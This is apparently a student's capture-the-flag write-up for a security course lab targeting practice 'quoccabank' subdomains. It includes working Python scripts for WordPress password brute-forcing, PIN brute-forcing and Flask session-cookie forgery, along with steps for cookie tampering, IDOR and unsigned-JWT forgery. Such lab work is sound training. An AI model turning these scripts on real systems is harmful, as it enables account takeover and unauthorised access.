@@ -1,0 +1,141 @@
+# Week 2
+
+blog subdomain
+
+1. meta tag flag attribute in root blog page source code, obtaining COMP6443{ivefinallyfoundsomeone}
+
+2. Noticing blog post pages had urls of the form 'blog.quoccabank.com/?p=x', manually trying x=2 redirected to 'blog.quoccabank.com?page_id=2', which contained a flag. I then wrote a Python script to extract 2 more flags (3 in total using this method).
+
+   ```python
+   # make requests to blog, bruteforcing page ids
+   for i in range(10000):
+     resp = requests.get(f'https://blog.quoccabank.com/?page_id={i}', cert=(cert_path, key_path))
+     matches = re.findall(r'COMP6443{.*?}', resp.text)
+     matches.remove('COMP6443{ivefinallyfoundsomeone}')
+     if matches:
+       print(matches)
+   ```
+
+   Obtained COMP6443{hiddenpostflag} from page 2, COMP6443{strongpasswordsaregreat} from page 45 and COMP6443{restructuringisonthecards} from page 53
+   Can also search for "comp" to get all three flags
+
+3. Each page with author has a body class of archive author author-{username} author-{userID} hfeed no-sidebar (full name in page title) 1 is admin, 2 is sarah, 3 is mq (Madame Quoc), 4 is timothy, 5 is administrator -> bruteforce Wordpress admin login page blog.quoccabank.com/wp-login.php for username mq with 10-million-password-list-top-10000.txt. Password: 1q2w3e. Users -> two remaining flags - COMP6443{Ifoundsarah}
+
+   ```python
+   ''' Make requests to blog Wordpress admin '''
+   def solve(throttle=0):
+       # make request
+       with open(os.path.expanduser('~/Downloads/10-million-password-list-top-10000.txt'), 'r', encoding='latin1') as f:
+           pwds = f.read().split()
+       for pwd in pwds:
+           burp0_url = "https://blog.quoccabank.com:443/wp-login.php"
+           burp0_cookies = {"wordpress_test_cookie": "WP%20Cookie%20check"}
+           burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:89.0) Gecko/20100101 Firefox/89.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://blog.quoccabank.com/wp-login.php", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://blog.quoccabank.com", "Upgrade-Insecure-Requests": "1", "Te": "trailers", "Connection": "close"}
+           burp0_data = {"log": "mq", "pwd": pwd, "wp-submit": "Log In", "redirect_to": "https://blog.quoccabank.com/wp-admin/", "testcookie": "1"}
+           resp = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data, cert=lientcert)
+           print((pwd, len(resp.text)))
+           if len(resp.text) != 8052:
+               return
+   
+   if __name__ == '__main__':
+       solve()
+   ```
+
+4. COMP6443{Ialsofoundtimmy}
+
+sales subdomain
+
+1. Burp suite indicated that a cookie with key metadata and value YWRtaW49MA%3D%3D was being sent on form submission, which didn't change with varying inputs. Upon searching what the HTML encoding for %3D was, I found that it represented the '=' character, which seemed like a base64 encoded string. Substituting and decoding, this refered to the string 'admin=0'. Simply updating the cookie to the base64 encoded version of 'admin=1', encoded appropriately, allowed me to gain access to the sales page and obtain the flag. 
+
+files subdomain
+
+1. Documents are of the form: files.quoccabank.com/document/{file_name}?r={base64encodedUser} - try filename=flag and r=base64encoded "admin" -> COMP6443{1D0R_1S_A_TH1NG.ejUzMTczMzc=.BpABuZPysYYVcCDRacwbUg==} TODO: I should probably remove /admin
+
+2. Go to /admin and brute force 4 digit access code - 1024 - COMP6443{I_DONT_LIKE_JAVASCRIPT.ejUzMTczMzc=.ZLsjDUcL97Db1nOZP2WV4Q==}
+
+   ```python
+   ''' Make requests to files '''
+   def solve(throttle=0):
+       # make request
+       from itertools import product
+       f = list(product([str(x) for x in range(10)], repeat=4))
+       for a,b,c,d in f:
+           burp0_url = "https://files.quoccabank.com:443/admin"
+           burp0_cookies = {"session": "eyJyb2xlIjoiVXNlciIsInVzZXJuYW1lIjoidGVzdCJ9.YMv2DQ.cHkNHtfSFW094ht3K1p82J9IbKo"}
+           burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:89.0) Gecko/20100101 Firefox/89.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://files.quoccabank.com", "Referer": "https://files.quoccabank.com/admin", "Upgrade-Insecure-Requests": "1", "Te": "trailers", "Connection": "close"}
+           burp0_data = {"pin": a+b+c+d}
+           resp = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data, cert=lientcert)
+           print((a+b+c+d, len(resp.text)))
+           if len(resp.text) != 198:
+               return
+   
+   if __name__ == '__main__':
+       solve()
+   ```
+
+3. Inspect JavaScript for login page (beautify) -> 
+
+   ````javascript
+   {
+     path: "/staff/wfh",
+     name: "wfh",
+     component: L
+   }
+   ````
+
+   Going to https://files.quoccabank.com/#/staff/wfh tells you to use https://files.quoccabank.com/covid19/supersecret/lmao/grant_staff_access?username={username} to give staff access to an account. Now that account has a new file "staff_super_secret_file" containing the flag COMP6443{DO_U_LIKE_JAVASCRIPT.ejUzMTczMzc=.7ok7sJmJHpi8hKg+RClAbQ==}.
+
+4. Doing this also creates the file "staff_flask_secret_key" of $hallICompareTHEE2aSummersday. The following script can be used to obtain a valid session cookie to access any account on the website
+
+   ```python
+   # Reference: https://ctftime.org/writeup/11812
+   import hashlib
+   from itsdangerous import URLSafeTimedSerializer
+   from flask.sessions import TaggedJSONSerializer
+   
+   KEY = '$hallICompareTHEE2aSummersday'
+   
+   def decode_flask_cookie(secret_key, cookie_str):
+       salt = 'cookie-session'
+       serializer = TaggedJSONSerializer()
+       signer_kwargs = {
+           'key_derivation': 'hmac',
+           'digest_method': hashlib.sha1
+       }
+       s = URLSafeTimedSerializer(secret_key, salt=salt, serializer=serializer, signer_kwargs=signer_kwargs)
+       return s.loads(cookie_str)
+   
+   
+   def encode_flask_cookie(secret_key, cookie):
+       salt = 'cookie-session'
+       serializer = TaggedJSONSerializer()
+       signer_kwargs = {
+           'key_derivation': 'hmac',
+           'digest_method': hashlib.sha1
+       }
+       s = URLSafeTimedSerializer(secret_key, salt=salt, serializer=serializer, signer_kwargs=signer_kwargs)
+       return s.dumps(cookie)
+   
+   
+   if __name__ == '__main__':
+       cookie = 'eyJyb2xlIjp7IiBiIjoiVTNSaFptWT0ifSwidXNlcm5hbWUiOiJ0ZXN0In0.YM3-0Q.Wr7mv0JrqapDElKfzFs2Vp7caHM'
+       cookie_val = (decode_flask_cookie(KEY, cookie))
+       print(cookie_val)
+       new_cookie = dict(cookie_val)
+       new_cookie['username'] = 'Admin'
+       new_cookie['role'] = b'Admin'
+       print(encode_flask_cookie(KEY, new_cookie)) 
+   ```
+
+   There is a new file with the flag COMP6443{WHAT_IS_FLAAAASK.ejUzMTczMzc=.ISojDDXPXIpn4yodwC2g7w==} as its file name.
+
+Extra findings:
+
+- XSS vulnerable content
+- /me contains json for all files
+- Intercepted new notes go to ./upload - can upload to another user's account?
+- File name affects url - can log in as another user (like first flag) using query stacking (only takes first in this case)
+
+notes subdomain
+
+1. Noticed refreshing after a while, "cookie expired" appeared -> check cookie with CookieManager. Tried manually changing expiration of notes_auth cookie, which didn't do anything. Noticed value of cookie was a JWT -> edited payload by overriding the expiry field to a bigger timestamp, and username from my zID@quoccabank.com to admin@quoccabank.com. Update the original cookie to the new JWT token to obtain the flag (server did not verify signature of jwt).
